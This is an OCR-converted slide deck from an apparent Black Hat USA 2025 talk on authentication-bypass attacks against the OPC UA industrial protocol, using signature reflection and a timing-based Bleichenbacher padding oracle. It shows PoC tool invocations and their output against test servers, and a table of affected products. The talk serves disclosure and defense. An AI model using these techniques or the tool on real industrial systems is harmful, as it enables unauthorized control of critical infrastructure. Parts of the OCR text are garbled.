---
title: "No VPN Needed Cryptographic Attacks Against the OPC UA Protocol"
speakers: ["Tom Tervoort"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol.pdf"
pages: 31
sha256: "0a84451edc027c9d5a217e13f91c3f83452ad5050bb1ba1adc7456d2e400a5fe"
text_chars: 25671
ocr_pages: 15
has_ocr: true
redacted_secrets: 0
companion_files: ["Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol_TOOLS.txt"]
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:02:36Z"
---
# No VPN Needed Cryptographic Attacks Against the OPC UA Protocol

**Speakers:** Tom Tervoort  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol.pdf` (31 pages)

## Slide 1

## No VPN Needed? Cryptographic Attacks Against the OPC UA Protocol

Tom Tervoort

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pie het
EFINGS
AUGUST a 2025
MANDALAY BAY / LAS VEGAS
No VPN Needed?
Cryptographic Attacks Against the OPC UA Protocol
Tom Tervoort
```

## Slide 2

### **INTRO**

**2**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Ty
ee ®
gy 4
S, >|
a a
Ss
182
|/BUREAU |
VERITAS
TOM TERVOORT
Principal Security Specialist
I tom tervoort@bureauveritas.com
BUREAU VERITAS CYBERSECURITY
BUREAU
VERITAS
CORPORATE PRESENTATION 2
```

## Slide 3

# Outline

#### **What is OPC UA? OPC UA Cryptography Attack 1: signing oracle auth bypass Attack 2: padding oracle auth bypass Follow-up and conclusions**

#BHUSA @BlackHatEvents

## Slide 4

# What is OPC UA?

#BHUSA @BlackHatEvents

Photos by Magda Ehlers, Tom Fisk, Pixabay, Mattcmoi

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
,
Photos by Magda Ehlers, Tom Fisk, Pixabay, Mattcmoi
```

## Slide 5

# Why investigate it?

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bifekhat
BRIEFINGS
OPC UA More exposed
!
I
I
!
I
' thing
!
I
I
!
I
Important <
OPC UA connections are secure in itself, hence generally there is no need for VPN in an OPC UA network
solution. In the past VPN tunnel for secure transmission and remote desktop connections were
used, but OPC UA includes encrypted transmission and adds user authentication and audit
« Secure: OPC UA is highly secure due to its encryption, authentication, checksums, data access, and authorization capabilities.
OPC-UA doesn't require a VPN, and the gateway enables a secure connection for outgoing data to the cloud when the
gateway is established. OPC-UA can also be used in the cloud and at the edge.
```

## Slide 6

# OPC UA security

**Client/server authentication:** X.509 certificates **User authentication:** password, JWT, cert, etc. Can have **both** , **either** or **neither**

**Trust models:** pre-configured, first-time approval, PKI Security Mode, user authentication method, and ciphers are **negotiated** between client and server

|**Security Mode**|**Client/Server Auth**|**Integrity**|**Confidentiality**|
|---|---|---|---|
|None|✗|✗|✗|
|Sign|✓|✓|✗|
|SignAndEncrypt|✓|✓|✓|

#BHUSA @BlackHatEvents

Image by OPC Foundation

## Slide 7

# Secure channel handshake

**(simplified)**

|**Security Policy**|**Encryption scheme**|**Signing scheme**|
|---|---|---|
|None|-|-|
|Basic128Rsa15|RSA PKCS#1v1.5|SHA1 + RSA PKCS#1v1.5|
|Basic256|RSA-OAEP-SHA1|SHA1 + RSA PKCS#1v1.5|
|Basic256Sha256|RSA-OAEP-SHA1|SHA256 + RSA PKCS#1v1.5|
|Aes128_Sha256_RsaOaep|RSA-OAEP-SHA1|SHA256 + RSA PKCS#1v1.5|
|Aes256_Sha256_RsaPss|RSA-OAEP-SHA256|SHA256 + RSA-PSS|

Also various ECC policies; rarely used yet

#BHUSA @BlackHatEvents

## Slide 8

# Session handshake

- Symmetric crypto based on AES and HMAC

- Challenge signing with same certificates as channel phase

- Password-based user auth: encrypt password with server public key, even with None policy

- Certificate-based user auth: sign same server challenge with “user certificate”

- Session bound to channel + key

- Very inefficient protocol: three expensive RSA decrypt/sign operations on each side! But is it secure?

#BHUSA @BlackHatEvents

## Slide 9

# Attacking the session handshake

###### **In server’s CreateSessionResponse:**

###### **In client’s ActivateSessionResponse:**

##### **Looks rather similar…**

#BHUSA @BlackHatEvents

## Slide 10

# Signing oracle “relay attack”

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
blackhat
BRIEFINGS
Signing oracle “relay attack”
&
a
OPC Server A Attacker OPC Server B
CreateSessionRequest -——— |
Identity: server B
l¢—@ | ClientNonce: ...
CreateSessionResponse
ServerNonce: N
ServerSignature: ... >
CreateSessionRequest
Identity: server A
ClientNonce: N a,
|
CreateSessionResponse
ServerNonce: ...
ActivateSessionRequest |__| ServerSignature: <sig over A
ClientSignature: <sig over cert + N with B's public key>
A cert + N with B's public
I<} key>
| ——_
ActivateSessionResponse
Result: — >)
```

## Slide 11

# Even better: “reflection attack”

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
blackhat
BRIEFINGS
Even better: “reflection attack”
an
OPC Server A Attacker
CreateSessionRequest ——— |
Identity: server A
l¢— | ClientNonce: ...
| ——— CreateSessionResponse
AuthenticationToken: 1
ServerNonce: N ——
ServerSignature: ...
CreateSessionRequest
le_—_@ | Identity: server A
ClientNonce: N
| ———_ CreateSessionResponse
AuthenticationToken: 2
ServerNonce: ... —>,
ServerSignature: <sig over
cert+N with A's pubkey>
ActivateSessionRequest
AuthenticationToken: 1
le—@ | ClientSignature: <sig over
A cert + N with A's public
key>
|_|
ActivateSessionResponse
Result: >!
```

## Slide 12

# But we still need to defeat this…

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bifekhat
BRIEFINGS
OPC Client OPC Server
OpenSecureChannelRequest
- Chosen security policy
- Client certificate
- Encrypted with server public key and
signed with client private key:
- Random "client nonce oe
a
OpenSecureChannelResponse
- Encrypted with client public key and
signed with server private key:
Gy - Random "server nonce"
- Channel Token
[>
Both sides derive session keys from nonces
```

## Slide 13

# …or we just skip it

OPC UA over HTTPS

- Skips secure channel handshake, because TLS already offers transport crypto

- No TLS client certs; **relies on session layer for client authentication**

#BHUSA @BlackHatEvents

## Slide 14

# PoC or it didn’t happen

**https://github.com/SecuraBV/opcattack**

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
,
ar : $ python3 opcattack.py reflect https://opc-testserver:62540/
attempting reflection attack against https://opc-testserver:62540/
Server advertises 7 endpoints.
Targeting https://opc-testserver :62540/Quickstarts/ReferenceServer/ with BASIC256SHA256 security policy.
User certificate required. Reusing the server certificate to forge user token.
Attack succesfull! Authenticated session set up with https://opc-testserver:62540/Quickstarts/ReferenceServer/.
Trying to browse data via authenticated channel.
Tree:
+ <root>
|+ Objects (OBJECT)
|+ Server (OBJECT)
|+ ServerArray (Array):
|+ ServerArray: "“urn:aardvarksoep:UA:Quickstarts:ReferenceServer"
|+ NamespaceArray (Array):
|+ NamespaceArray: "http://opcfoundation.org/UA/"
|+ NamespaceArray: "urn:aardvarksoep:UA:Quickstarts:ReferenceServer"
|+ NamespaceArray: "http: //opcfoundation.org/Quickstarts/ReferenceServer"
|+ NamespaceArray: "http://test.org/UA/Data/"
|+ NamespaceArray: "http://test.org/UA/Data/Instance"
|+ NamespaceArray: "http://opcfoundation.org/UA/Boiler/"
|+ NamespaceArray: "http://opcfoundation.org/UA/Boiler/Instance"
|+ NamespaceArray: "http://test.org/UA/Alarms/"
|+ NamespaceArray: "http://test.org/UA/Alarms/Instance"
|+ NamespaceArray: "http://opcfoundation.org/UA/Diagnostics"
|+ NamespaceArray: "http://samples.org/UA/MemoryBuffer"
|+ NamespaceArray: "http://samples.org/UA/MemoryBuffer/Instance"
|- ServerStatus: <decode error> ("Extension object type ID 864 not registered.")
|- ServiceLevel: "255"
|<
Ic
Auditing: "True"
EstimatedReturnTime: "None"
https://github.com/SecuraBV/opcattack
```

## Slide 15

# Idea to attack OPC over TCP: the 1998 classic

**Security Policy Encryption scheme Signing scheme** - - None Basic128Rsa15 RSA PKCS#1v1.5 SHA1 + RSA PKCS#1v1.5 Basic256 RSA-OAEP-SHA1 SHA1 + RSA PKCS#1v1.5 Basic256Sha256 RSA-OAEP-SHA1 SHA256 + RSA PKCS#1v1.5 A 128 Sh 256 R O RSA OAEP SHA1 SHA256 RSA PKCS#1 1 5

#BHUSA @BlackHatEvents

## Slide 16

# Deprecated?

###### However:

- Many implementations allow Basic128Rsa15 by default anyway

- Some implementations attempt to decrypt PKCS#1 ciphertext before checking if Basic128Rsa15 is enabled

- Software updates won’t change existing configurations

- Risks not clear to user; problem is not SHA1

- **OAEP also insecure when keys are reused for PKCS#1**

#BHUSA @BlackHatEvents

## Slide 17

# Bleichenbacher’s attack

**(simplified)**

RSA encryption: RSA padding: message bytestring -> integer m PKCS#1 padding: Server padding check fails: m has different format Otherwise: m starts with 0x02; information on message is leaked Attack: send specifically chosen c values, and observe which decrypt to an m with correct padding. Narrow down exact value of m after +/- 1,000,000 queries to the “padding oracle”.

#BHUSA @BlackHatEvents

## Slide 18

# Two private key operations

Note: Bleichenbacher attack can also **spoof signatures** because RSA signing ≈ RSA decryption

#BHUSA @BlackHatEvents

## Slide 19

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
OPC Server
Attacker
Attacker's client nonce
Bleichenbacher attack
l< >|
I< >|
I< >
I< >|
I< >
I< >|
I< >|
Ey spoofed!
OpenSecureChannelRequest
- Chosen security policy
- Server's own certificate
- Message with spoofed signature
encrypted with server public key:
Attacker's client nonce ae
OpenSecureChannelResponse
- Encrypted with server public key and
signed with server private key:
ZN
2222222
2
7
Bleichenbacher attack
I< >|
I< >
I< >|
I< >
I< >|
< >|
I< >|
- Random "server nonce" decrypted!
- Channel Token :
Can compute 4
```

## Slide 20

# Error-based padding oracle

- Different behaviour per implementation

- For some padding errors can be distinguished; for others they are identical to signature errors (which occur after decrypting an invalid message)

#BHUSA @BlackHatEvents

## Slide 21

# Timing-based padding oracle **Maybe valid padding has a different response time?**

**But aren’t timing attacks hard and impractical? Sounds complicated…**

#BHUSA @BlackHatEvents

Images by Yarom et al., Brumley et al., Andrey Grushnikov

## Slide 22

# A timing “side channel amplifier”

###### **“ECB” RSA decryption in OPC UA:**

Idea: repeat same ciphertext block e.g. 100 times Bad padding: do 1 decrypt; then fail Good padding **do 100 decrypts** ; then fail

#BHUSA @BlackHatEvents

ECB Penguin by Filippo Valsorda

## Slide 23

# Timing attacks made easy

Highly sophisticated false positive elimination model:

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifeichat
BRIEFINGS
: good padding; H
9 bad padding; tine: * Rereariaaeer saa
97: good padding; time: 0.10941171646118164
98: bad padding; time: 0.0047380924224853516
99: bad padding; time: 0.005006074905395508
few (Oa BoP Se Highly sophisticated false positive elimination model:
Timing experiment results:
Expansion parameter 10:
Average time with correct padding: 0.018887882232666017
Average time with incorrect padding: 0.005357732772827148
Shortest time with correct padding: 0.016694307327270508
Longest time with incorrect padding: 0.022701740264892578
duration > self. threshold:
i range(0, self. repeats):
start = time.time()
self. base. attempt _query(payload)
duration time. time() start
Expansion parameter 30:
Average time with correct padding: 0.03950897693634033
Average time with incorrect padding: 0.005196962356567383
Shortest time with correct padding: 0.035872697830200195
Longest time with incorrect padding: 0.011386394500732422 duration self. threshold:
Expansion parameter 50:
Average time with correct padding: 0.06519682884216309
Average time with incorrect padding: 0.005134844779968261
Shortest time with correct padding: 0.05526590347290039
Longest time with incorrect padding: 0.009844779968261719
Expansion parameter 100:
Average time with correct padding: 0.1187872519683838
Average time with incorrect padding: 0.00542763729095459
Shortest time with correct—paddinga: 0.19398173332214355
Longest time with incorrect padding: 0.013846635818481445
```

## Slide 24

# Wait for it…

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifeichat
BRIEFINGS
rt:~/research/opc/tool$ python3 opcattack.py reflect opc.tcp://opc-testserver:4840 --bypass-opn -C 10 -T 0.02
Attempting reflection attack against opc.tcp://opc-testserver :4840
Server advertises 11 endpoints.
No HTTPS endpoints. Trying to bypass secure channel on opc.tcp://opc-testserver:4840 via padding oracle.
Trying sigforge attack to produce OPN signature. . . c
Checking rr endpoints of ope. tp: //opc-testserver:4840 for RSA padding oracle. total: (000:00:02.300 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap:000:00:02.300 record | zero
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability.
Progress:
OPN padding oracle score: 0/100
Base OPN not working. Testing tim
Progress: = =
Timing-based OPN padding oracle scor 100/100
None of the endpoints qualify for Password oracle.
None of the endpoints qualify for Password (alt) oracle.
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
Padded hash of payload: oooiffffrrTTTT TFT FF FFF FFF FFF FFF FFF FFF FFF FFF FT FTF FF FFF FF FFF FFF FF FFF FT FFF FF fF FF FFF FF FFF FF FFF FFF FF FFF FFF FF FFF FF FFF FF FFF Ff FFF FFF FF FFF FF FFF FFFFF
FF FFFFFFFFFFFFFFFFF EEF FFE FFF EFF FEF EEE FOO3021300906052b0e03021a050004140ca3233b89100d91b58849c64aa51e758e027005
*] Starting padding oracle attack...
|] Progress: iteration 0; interval size: 4.93E+611; oracle queries: 111
stopwatch
File Edit Run Help
stop
```

## Slide 25

# Wait for it…

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifeichat
BRIEFINGS
rt:~/research/opc/tool$ python3 opcattack.py reflect opc.tcp://opc-testserver:4840 --bypass-opn -C 10 -T 0.02
Attempting reflection attack against opc.tcp://opc-testserver :4840 stopwatch
Server advertises 11 endpoints.
No HTTPS endpoints. Trying to bypass secure channel on opc.tcp://opc-testserver:4840 via padding oracle.
Trying sigforge attack to produce OPN signature. . “O0-
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle. total: 000:00:21.283 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap: 000:00:21.283 record | zero
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability.
Progress: stop
OPN padding oracle score: 0/100
Base OPN not working. Testing tim
Progress: = =
Timing-based OPN padding oracle scor 100/100
None of the endpoints qualify for Password oracle.
None of the endpoints qualify for Password (alt) oracle.
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
Padded hash of payload: oooiffffrrTTTT TFT FF FFF FFF FFF FFF FFF FFF FFF FFF FT FTF FF FFF FF FFF FFF FF FFF FT FFF FF fF FF FFF FF FFF FF FFF FFF FF FFF FFF FF FFF FF FFF FF FFF Ff FFF FFF FF FFF FF FFF FFFFF
FFFFFFFFFFFFFFFFFF FFF FFF FFFFFF PEF FFF FT FT TF £FFO03021300906052b0e03021a050004140ca3233b89100d91b58849c64aa51e758e027005
[*] Starting padding oracle attack...
[\] Progress: iteration 1; interval size: 4.93E+611; oracle queries: 3686
File Edit Run Help
```

## Slide 26

# Wait for it…

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifeichat
BRIEFINGS
:~/research/opc/tool$ python3 opcattack.py reflect opc.tcp://opc-testserver:4840 --bypass-opn -C 10 -T 0.02
Attempting reflection attack against opc.tcp://opc-testserver :4840
Server advertises 11 endpoints.
No HTTPS endpoints. Trying to bypass secure channel on opc.tcp://opc-testserver:4840 via padding oracle.
Trying sigforge attack to produce OPN signature. . “OA:
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle. total: 000:04:57.302 _ record | zero
Endpoint "opc.tcp://opc-testserver:4840" qualifies for OPN oracle. lap: 000:04:57.302 record | zero
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability.
Progress: stop
OPN padding oracle score: 0/100
Base OPN not working. Testing tim
Progress: = =
Timing-based OPN padding oracle scor 100/100
None of the endpoints qualify for Password oracle.
None of the endpoints qualify for Password (alt) oracle.
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver:4840.
Padded hash of payload: oooiffffrrTTTrT TFT FFF FFF F FFF FT FFF FT FFF FTF FFF FT FFF FF FFF FF FFF Ff FFF FFF FTF FFF FF fF FF FFF FF FFF FFF FF FFF FF FFF Ff FFF Ff ff FF Ff FFF FF FFF Ff FFF FFF FF FFF FFF FFF FFFF
FF FFFFFFFFFFFFF FFF ££ FFE SE FFF FF FF EFF EPP O03021300906052b0e03021a050004140ca3233b89100d91b58849c64aa51e758e027005
*] Starting padding oracle attack...
fl ] Progress: iteration 252; interval size: 2.94E+531; oracle queries: 49323
stopwatch
File Edit Run Help
```

## Slide 27

# Got the signature, and…

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Gn. —
Got the signature, and...
[*] Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver :4840.
[*] Padded hash of payload: OOo1fffFFFFFFFFFFFFFFFFFF FFT fff fff rrrrrrrrrrrrrrtrttttttttttttttt rrr rrrrrrrrrrrrtttttttttttttttttrrrrrrrrrrrrrrt ttt ttt ttttttttttt rrr rrrrrrt
FFF FFFFFEEEEEFFE EE EE FEF FEF FEE EE EEE FFF FFF FEF FFF FF FFF FFF FFF EFF EEE FFF FF FFF FFF FFF FF FFF FFF FFF FF FF FF FF FF FF FFF FFF FFF FFF FF FF FFF FF FFF FFF FFT FFF fF FF FFF FF FF FFF FFF FF FF FFFFFFFFFFF
FF FFFFFFFFFFFFEFE ET TTF ETT FT fff fff fff fff ff003021300906052b0e03021a050004140ca3233b89100d91b58849c64aa51e758e027005
[*] Starting padding oracle attack...
[\] Progress: iteration 2016; interval size: 2.00E+0; oracle queries: 5586985
[+] Succes! Forged signature:
[+] 630061a69ebb0a4c7bcadb470fe02284991301180ecdf281b237536cdb3791bb1f 3cbf9af9ee464b8c825F3e94c77d8567beS5ddf952041e7804F9e2 fF 4de136f 7bcfbcf5e3af323513110fe3cafO7eb55f3F4e98
fd1688d5c48e486155525c7c41b7da52477 f 5e96d083dc0575934a0e628cF37adbO33e8F74a0e484cd98b3Fd9b3627838ce9b92d12afca560701ef f9d2275d3c82F0d2ab79621895cab55606Fb294d4a37486526164
134f8792b84849e302f053cf2beb8b2e37b2d3a9d2c4c5fa8d8C7752b359ca6b3648C2012a6c716edcd28750f07b572
[*] Message bytes after applying encryption: 4f504e46290600000000000038000000687474703a2f2f6f7063666f756e646174696f 6e2e6f 72672f55412F5365637572697479506F6c6963792342617369
1a9a00302010202140ae9c5a5fbdb71789d5d372ba76d945a8450fd9b300d06092a864886 Ff 70d01010b05003070310b3009060355040613024e4c3113301106035504080c0a536f6d652d53746174653121301F06035
320507479204c74643129302706035504030c2075726e3a6f 70656€36323534312e7365727665722e6170706C696 36174696 F6e301e170d3234303531373133333632385a170d3235303531373133333632385a3070
104080c0a536f6d652d53746174653121301F060355040a0C18496e7465726e6574205769646769747320507479204c74643129302706035504030c2075726e3a6f 70656€36323534312e7365727665722e6170706C6:
id01010105000382010f003082010a0282010100b12a4F44d28f 1d2e243cc61728515be0b3dd88b5a1b40f 4d7626860bd4dbd0141ccc648c1189F51e722685F882C909b7b48F662b80466036 fdd816ba89eca4a015aa
f0653eafd3ab1dd50d4f8b3d4376b6c2f6308279f6311F97Cc6e847cf3b6a894ebbeed5edd697c6fbd3b00244f 6ef43b98d525279bb484eabab4c7e14F f5918F813a6F9d7615c276b1dec800054b21cef757ab4c26c1
'7a3e1ad26802fb7761384901050fd597e4a7cOb50e3dde695a0aca3b4aefe8f fbe6f7a9602dc2884c48960b283138d1e3972F3016493daf8b4fcSbbefb78f3d0d0203010001a3533051301d0603551d0e0416041458.
1F0603551d2304183016801458a6b7cf13360786cab5a1d9c38Fdf89996e02d1300F0603551d130101F F040530030101Ff F300d06092a864886 Ff 70d01010b0500038201010028bf F5545aabebaf6a51ede1e4a39ab74,
I9a2c9d70e5c86a47222d385cfefd5b6dee8a0a5340b43e64F 7035481d3bf6458ef 36096875a8513992dfe2c91275b32796d67adce007402e4757735f 7a7f7b107624935f8c24c0393986c6cba6eeabO05d08c8270F75
2b45922a495345f O5bf5e3e822d5de62461a1e4711a99b52d32c1ae8c2a64e290e486b1477c2c34c7865d1eb35F083d020276Fbf91846628cd24c6465f F294d3Fc7cd9e1e50f59ea43c5096f 0de48a74b4a703a9943
69failebifaa2b0cc91400000040a3d95bceab71e4F7c80247560c1a6dc948332bad976e8ed7aca790d4bce72c1a2b3092F 4c fa180974dba1827eed5eb9803bf2752a4c6419ec60eb35896F9e774d22955668fefda45
1aec01834b5a224a84be2d893a633744305c9c8C7Ce72925535be81e953cfad481f6459b9574ad06e156ae05c5d47F0d72131c79efebc71918c320c450457eae62c4512¢4 -
2 fF 6eceb416abSae9d75fF93842c03bfd2F2292ef 787 feeb42f9b69a7a074040fbeac31807ce6876a36ea248babd3bfd49Fdd035e64b9b7b42d07c832352775680Fedd004 stopwatch
id 319c69be9c2defaa7a8522187c3dcf913cb0b38c444Ff 3c605e8ce78740c32cba24819b022c64bbce0615a3281eb42113c2cf5ee5a9a126F31991857952b66268822F04
1a817ee0254497dadbf3d118f647c2f0e355ee4a36bf 1bb4ca428c8Ff5cd978d6f53ade4714a9c26b29d5a157e3d75fb25d30d06a0dbf965933958dbac28ae8850fd701c6
s698da22fe0587fcleazesd9fa2za2z4fob2 ; ; ; total: 000:08:30.788 record | zero
Storing signed+encrypted OPN request in cache file .opncache. json.
Picking a padding oracle for decryption. lap:|000:08:30.788 record | zero
Checking 11 endpoints of opc.tcp://opc-testserver:4840 for RSA padding oracle.
Endpoint “opc.tcp://opc-testserver:4840" qualifies for OPN oracle.
Trying a bunch of known plaintexts to assess OPN oracle quality and reliability
Progress: [
OPN padding oracle score: 0/100
Base OPN not working. Testing timing-based variant (threshold: 0.02 seconds); this may take a minute.
Progress:
Timing-based OPN padding oracle score: 100/100
None of the endpoints qualify for Password oracle.
None of the endpoints qualify for Password (alt) oracle.
Continuing with Timing-based OPN padding oracle for endpoint opc.tcp://opc-testserver :4840.
Performing the OPN handshake...
Forged OPN request was accepted. Now keeping this session open while decrypting the first block of the response.
Progress: iteration 1; interval size: 4.93E+611; oracle queries: 165
File Edit Run Help
top
```

## Slide 28

# There we go!

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
,
here we go!
[/] Progress: iteration 2016; interval size: 2.00E+0; oracle queries: 3470896
[+] Success! Got the following plaintext: 0002198568a3410e38090001000000010000000100c10199e6 7ca6dce5db019000000000000000000F FFT fff FO0000000000000cef500000800000099e67caédce.
id d055942c83499999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999:
19999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999908F 26357a49aecc8387478
[*] Removed padding. Now parsing OpenSecureChannelResponse to extract channel ID and secret nonce:
+ openSecureChannelResponse (OpenSecureChannelResponse):
|+ typeId (NodeId):
|+ namespace: 0
|+ identifier: 449
|+ responseHeader (ResponseHeader ):
|+ timeStamp: 2025-06-25 14:22:58.633000
|+ requestHandle: 0
|+ serviceResult: 0
|+ serviceDiagnostics: NULL
|+ stringTable: []
|+ additionalHeader: NULL
|+ serverProtocolVersion: 0
|+ securityToken (ChannelSecurityToken):
|+ channelId: 62926
|+ tokenId: 8
|+ createdAt: 2025-06-25 14:22:58.633000
|+ revisedLifetime: 600000
|+ serverNonce: 2e89a0353dac65db5a7dfd055942c834
Trying reflection attack (if channel is still alive).
Creating first session on login endpoint (opc.tcp://opc-testserver :4840)
Got server nonce: b'e9fc274d68bae227244d76e6db48ef 9d2e31311b6F3712c20039d434F8434bc7'
Forwarding nonce to second session on impersonate endpoint (opc.tcp://opc-testserver : 4840)
] Got signature over nonce: b'777fc6cbb269b7fbbd8407133a70a8570dd43e1ec8a706915a94ad3971306748fdf990F064b13F12f511e2e032¢c405374e58e59c5a76b42d048dcadfd55c9F521f429d67d9C
171732db267 3baQabeOee18af 4F99d0d612ccOe5d7adfcbe1e6cb49a91a59205F437cf6eF6a5547791326ca7 56e9adbf10d808a0b5b02d66dd70f66ce70Cc00689982a27 7ed063bd47 7bOaadf 4F14913904e5aa6fa741
leca4f18b24531c37e74f F088279Fb0a5b5d3687 7d006 7 6beb5be3d843e6 F792F9658064724b4808e8fe67 3d18c3628cOf6dac245907b58eda9613c3754'
[*] Using signature log in to opc.tcp://opc-testserver : 4840.
Attack succesfull! Authenticated session set up with opc.tcp://opc-testserver :4840. stopwatch
Tryin row: vi henti hannel. .
Ten to browse data via authenticated channel File Edit Run Help
i ae ; (CERSINES total: 000:15:30.502 record | zero
- FolderType
|+ Objects (OBJECT) lap: 000:15:30.502 record | zero
|- FolderType (OBJECTTYPE) ——
|+ Server (OBJECT)
|- ServerType (OBJECTTYPE)
|- Auditing: "False"
|- ServiceLevel: "255"
|+ NamespaceArray (Array):
|+ NamespaceArray: "http://opcfoundation.org/UA/"
|+ NamespaceArray: "“urn:open62541.server.application”
|+ ServerArray (Array):
|+ ServerArray: "“urn:open62541.server.application"
|+ ServerRedundancy (OBJECT)
|- ServerRedundancyType (OBJECTTYPE)
|- RedundancySupport: "0"
|+ VendorServerInfo (OBJECT)
```

## Slide 29

# Tested implementations

|**Software**|**Tested version**|**HTTPS attack**|**Error-based padding**
**oracle**|**Timing-based padding**
**oracle**|
|---|---|---|---|---|
|dataFEED edgeConnecto|r 2024.01|✗|✗|✗|
|Ignition|8.1.38|✗|✓|✓|
|KEPServerEX|6.15.154.0|✗|✗|✓*****|
|open62541|1.4|✗|✗|✓|
|Prosys OPC UA
Simulation Server|5.4.6-180|✓|✓|✓|
|UA-.NETStandard||✓|✓*****|✓*****|
|Reference Server|1.4.372-preview||||
|Unified Automation C++
Demo Server|1.8.2.624|✗|✗|✗|

* Only in non-default configuration

Protocol flaw -> others likely affected Got confirmation about CODESYS and various Siemens products

#BHUSA @BlackHatEvents

## Slide 30

# Follow-up

- Disclosed to OPC Foundation; who coordinated to vendors

- Very fast response!

- CVE’s so far: CVE-2024-42512, CVE-2024-42513, CVE-2025-1468

- Fixes range from software updates to disabling features to configuration advisories

- Check your vendor documentation

- Non-certificate based user authentication is not affected

- Disabling HTTPS and Basic128Rsa15 is usually sufficient, but not always

- Testing and PoC exploitation tool: **https://github.com/SecuraBV/opcattack**

#BHUSA @BlackHatEvents

## Slide 31

# Black Hat Sound Bytes

1. Crypto protocol design is hard, even if you use secure building blocks

2. More than a quarter century later, Bleichenbacher's attack is as relevant as ever.

3. We can probably expect more OPC UA crypto flaws to surface in the future.

So do you need to go back to use a VPN? Well..

#BHUSA @BlackHatEvents

Image by Sinh Tran

## Companion resources

### `Tom Tervoort_No VPN Needed Cryptographic Attacks Against the OPC UA Protocol_TOOLS.txt`

```text
https://github.com/SecuraBV/opcattack
```
